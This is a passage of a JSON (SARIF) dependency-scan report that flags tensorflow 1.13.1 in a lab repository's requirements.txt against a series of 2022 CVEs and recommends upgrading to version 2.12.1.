            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35990 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35990](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35990)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9c6773996e88ac5520753a5978c65a9bd8744f7f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36005",
          "ruleIndex": 367,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36005 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36005)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ed0eaaf2ff9a3bb6af9d7b099748430bc610f277"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36013",
          "ruleIndex": 368,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36013 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36013)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "148fbcb8f1cdb65332574c1c8d6e5ba8b1b95b56"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35999",
          "ruleIndex": 369,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35999 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35999](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35999)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1cc6db1482b9bebc6e933a075a676e18d4fc29d4"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35983",
          "ruleIndex": 370,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35983 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35983](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35983)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "61e650cbefdbcc651ab92bd5128aa60127db90bb"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35982",
          "ruleIndex": 371,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35982 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35982](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35982)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1a54fe7b275f4f5ef635013b4d7b5967d08d9704"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35963",
          "ruleIndex": 372,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35963 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35963](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35963)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d974bc8d0641a6b8c3e9769ee79b472bfb1fd41c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35969",
          "ruleIndex": 373,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35969 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35969](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35969)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7b35e2b1c89a2ec742f06b7fea6efbd37ffd23ba"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35974",
          "ruleIndex": 374,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35974 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35974](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35974)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "65c9c686f3377c5216af629be30ea050f32aa469"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36003",
          "ruleIndex": 375,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36003 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36003](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36003)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3174ec851c7d1833b7c27031e169dc7a4d613b6a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35959",
          "ruleIndex": 376,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35959 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35959](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35959)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3ee8966b2d7157b5c70910945416c0f1bff6732f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35960",
          "ruleIndex": 377,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35960 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35960](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35960)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "09450d16c0f49f2196dc3108e1c43134fac31a0d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35967",
          "ruleIndex": 378,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35967 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35967](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35967)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c41d90e71bb7c37043d2837a8729de73900e6769"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35973",
          "ruleIndex": 379,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35973 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35973](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35973)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3024887b48742472cae6f153b4190b0b47180f27"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36011",
          "ruleIndex": 380,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36011 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36011](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36011)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d5c418319b2ea9a7fcb4972883d4dd00c193e530"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36001",
          "ruleIndex": 381,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36001 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36001](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36001)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b7b35b83b771d779200edefcb5a18b2584185719"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35987",
          "ruleIndex": 382,
          "level": "warning",
          "message": {
